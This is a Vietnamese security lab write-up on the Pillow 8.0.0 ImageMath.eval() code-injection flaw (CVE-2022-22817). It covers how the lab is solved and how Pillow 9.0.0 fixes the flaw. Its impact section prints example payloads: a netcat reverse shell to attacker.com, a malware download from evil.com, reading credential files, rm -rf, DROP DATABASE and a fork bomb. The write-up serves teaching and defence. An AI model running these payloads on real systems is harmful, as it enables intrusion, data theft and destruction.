# Lab 2

## View code

- Dựa vào hint, phiên bản pillow được sử dụng là 8.0.0

### Lỗ hổng CVE-2022-22817 trong Pillow 8.0.0

- Lỗ hổng nằm ở module PIL.ImageMath.eval() - một hàm được thiết kế để đánh giá các biểu thức toán học trên các kênh ảnh.

- Trong Python, __builtins__ chứa TẤT CẢ hàm built-in

- Có nghĩa là attacker có thể dùng:
  -  __import__(): Import bất kỳ module nào
  - eval(): Thực thi code lồng nhau
  - ... nhiều hàm khác

- Use case bình thường:
  - eval("r+g+b", {"__builtins__": __builtins__}, {"r": red_channel, "g": green_channel, "b": blue_channel})
  - Kết quả: cộng 3 kênh màu

- Attacker:
  - eval("__import__('os').system('whoami')", {"__builtins__": __builtins__}, {...})
  - Kết quả: chạy lệnh hệ thống

- Trong code, có sử dụng đến hàm eval của Pillow 8.0.0 => Lỗ hổng: function_str từ user được truyền trực tiếp vào ImageMath.eval() mà không validation => Có thể thực thi các lệnh hệ thống!

## Giải lab

- Tải một file ảnh bất kì trên mạng
- Upload file ảnh, nhập input cơ bản convert(r+g+b, 'L') => Nhận kết quả
- Dựa vào lỗ hổng đã kiếm được, ta thực thi thử lệnh exec(exit()) => server error

**Khi thực thi `exec(exit())`:**

```python
output = ImageMath.eval(function_str, img=img, b=b, r=r, g=g)

# Với function_str = "exec(exit())"
# ImageMath.eval() gọi Python's eval():
eval("exec(exit())", {"__builtins__": __builtins__}, {...})

# Vì có __builtins__, attacker có thể dùng exec() và exit()
exec(exit())

# exit() được gọi → raise SystemExit exception
# Python process BỊ TERMINATE ngay lập tức
# Code KHÔNG CHẠY TIẾP được
# Rơi vào except block

except Exception as e:
    return render(request, "Lab/A9/a9_lab2.html", {"data":"Please Upload a file", "error":True})
```

## Mức độ ảnh hưởng

### **CVSS Score: 9.8/10 (Critical)**

**Tác động:**

1. **Remote Code Execution (RCE)**
   - Attacker có thể thực thi lệnh hệ thống tùy ý
   - Không cần authentication (trong nhiều trường hợp)
   - Exploit từ xa qua HTTP request

2. **Data Breach - Rò rỉ dữ liệu**
   ```python
   # Đọc file nhạy cảm:
   __import__('os').system('cat /etc/passwd')
   open('/var/www/config/database.yml').read()
   ```

3. **System Compromise - Chiếm quyền server**
   ```python
   # Reverse shell:
   __import__('os').system('nc attacker.com 4444 -e /bin/sh')
   
   # Download malware:
   __import__('urllib.request').urlretrieve('http://evil.com/malware.py', '/tmp/m.py')
   ```

4. **Privilege Escalation - Leo thang đặc quyền**
   - Nếu web service chạy với quyền cao (root, administrator)
   - Attacker chiếm toàn bộ hệ thống

5. **Lateral Movement - Di chuyển ngang trong mạng**
   ```python
   # Scan mạng nội bộ:
   __import__('os').system('nmap -sn 192.168.1.0/24')
   ```

6. **Data Destruction - Phá hoại dữ liệu**
   ```python
   # Xóa file:
   __import__('os').system('rm -rf /var/www/data/*')
   
   # Drop database:
   __import__('subprocess').call(['mysql', '-e', 'DROP DATABASE production'])
   ```

7. **Denial of Service (DoS)**
   ```python
   # Fork bomb:
   __import__('os').system(':(){ :|:& };:')
   
   # Fill disk:
   __import__('os').system('dd if=/dev/zero of=/tmp/fill bs=1M count=100000')
   ```

## Cách khắc phục

- Cập nhật Pillow lên phiên bản mới nhất (từ 9.0.0 trở lên)

**Pillow 9.0.0+ (Đã sửa lỗi):**

- Hạn chế các tên biến hợp lệ:
  - Mọi tên được sử dụng trong biểu thức (expression) sẽ được quét qua code.co_names (danh sách các tên biến/hàm mà mã compiled sử dụng).
  - Nếu tên đó không có trong args và không phải là abs, sẽ bị chặn ngay lập tức.
-> Ngăn việc gọi __import__, os, sys, ...`.

- Giới hạn builtins
  - Không còn cho phép bất kỳ hàm built-in nào khác ngoài abs.

- Kiểm tra đệ quy hằng số an toàn
  - Hàm scan() đi sâu vào các hằng số con (code objects) trong biểu thức để đảm bảo không có đoạn code độc hại ẩn.


